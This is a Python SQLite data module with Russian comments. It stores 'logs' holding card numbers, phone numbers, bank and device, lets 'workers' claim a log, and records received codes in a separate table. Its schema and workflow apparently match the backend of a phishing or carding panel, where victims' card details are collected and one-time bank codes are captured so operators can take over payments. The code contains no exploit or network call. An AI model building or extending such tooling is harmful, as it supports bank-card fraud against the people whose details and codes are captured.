import sqlite3
import json
from datetime import datetime
from config import DB_NAME

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id TEXT PRIMARY KEY,
            card TEXT,
            phone TEXT,
            bank TEXT,
            device TEXT,
            status TEXT DEFAULT 'waiting',
            worker_id INTEGER,
            worker_name TEXT,
            message_id INTEGER,
            code TEXT,
            error_text TEXT,
            created_at TEXT,
            updated_at TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            log_id TEXT,
            code TEXT,
            status TEXT DEFAULT 'pending',
            message_id INTEGER,
            created_at TEXT,
            FOREIGN KEY (log_id) REFERENCES logs(id)
        )
    ''')
    
    conn.commit()
    conn.close()

class Log:
    def __init__(self, id, card, phone, bank, device, status='waiting', 
                 worker_id=None, worker_name=None, message_id=None, 
                 code=None, error_text=None, created_at=None, updated_at=None):
        self.id = id
        self.card = card
        self.phone = phone
        self.bank = bank
        self.device = device
        self.status = status
        self.worker_id = worker_id
        self.worker_name = worker_name
        self.message_id = message_id
        self.code = code
        self.error_text = error_text
        self.created_at = created_at or datetime.now().isoformat()
        self.updated_at = updated_at or datetime.now().isoformat()
    
    def save(self):
        """Сохранить лог в БД"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO logs 
            (id, card, phone, bank, device, status, worker_id, worker_name, 
             message_id, code, error_text, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (self.id, self.card, self.phone, self.bank, self.device, 
              self.status, self.worker_id, self.worker_name, self.message_id,
              self.code, self.error_text, self.created_at, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
    
    @staticmethod
    def get_by_id(log_id):
        """Получить лог по ID"""
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM logs WHERE id = ?', (log_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return Log(
                id=row[0], card=row[1], phone=row[2], bank=row[3],
                device=row[4], status=row[5], worker_id=row[6],
                worker_name=row[7], message_id=row[8], code=row[9],
                error_text=row[10], created_at=row[11], updated_at=row[12]
            )
        return None
    
    def update_status(self, status, error_text=None):
        """Обновить статус"""
        self.status = status
        if error_text:
            self.error_text = error_text
        self.save()
    
    def take(self, worker_id, worker_name):
        """Взять лог"""
        self.status = 'taken'
        self.worker_id = worker_id
        self.worker_name = worker_name
        self.save()
    
    def add_code(self, code):
        """Добавить код"""
        self.code = code
        self.status = 'code_received'
        self.save()
        
        # Также сохраняем в таблицу кодов
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO codes (log_id, code, created_at)
            VALUES (?, ?, ?)
        ''', (self.id, code, datetime.now().isoformat()))
        conn.commit()
        conn.close()

# Инициализация БД при импорте
init_db()
